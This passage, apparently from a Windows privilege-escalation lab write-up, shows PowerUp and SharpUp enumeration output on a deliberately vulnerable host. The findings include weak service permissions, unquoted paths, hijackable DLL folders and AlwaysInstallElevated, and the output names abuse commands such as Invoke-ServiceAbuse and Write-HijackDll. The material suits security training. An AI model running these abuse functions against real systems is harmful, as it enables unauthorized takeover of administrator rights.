        ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo, FirefoxHistory, 
        InstalledProducts, InterestingFiles, LogonEvents, LOLBAS, 
        McAfeeSiteList, MicrosoftUpdates, OutlookDownloads, PowerShellEvents, 
        Printers, ProcessCreationEvents, ProcessOwners, RecycleBin, 
        reg, RPCMappedEndpoints, ScheduledTasks, SearchIndex, 
        SecurityPackages, SysmonEvents

```

#### PowerUp.ps1

```
PS C:\PrivEsc> . .\PowerUp.ps1
PS C:\PrivEsc> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : unquotedsvc
Path          : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'unquotedsvc' -Path <HijackPath>





[*] Checking service executable and argument permissions...


ServiceName    : filepermsvc
Path           : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile : C:\Program Files\File Permissions Service\filepermservice.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'filepermsvc'





[*] Checking service permissions...


ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'daclsvc'

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'UsoSvc'





[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Temp\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Temp\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 
                 'C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' -Command 
                 '...'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : C:\Program Files\Autorun Program\program.exe





[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...
```

#### SharpUp.exe

```
C:\PrivEsc>SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"
  Name             : UsoSvc
  DisplayName      : Update Orchestrator Service
  Description      : Manages Windows Updates. If stopped, your devices will not be able download and install latest udpates.
  State            : Running
  StartMode        : Auto
  PathName         : C:\Windows\system32\svchost.exe -k netsvcs -p


=== Modifiable Service Binaries ===

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"


=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1


=== Modifiable Folders in %PATH% ===

  Modifable %PATH% Folder  : C:\Temp


=== Modifiable Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe


=== *Special* User Privileges ===

                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED


=== Unattended Install Files ===

 C:\Windows\Panther\Unattend.xml


=== McAfee Sitelist.xml Files ===



=== Cached GPP Password ===

  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.


[*] Completed Privesc Checks in 2 seconds
```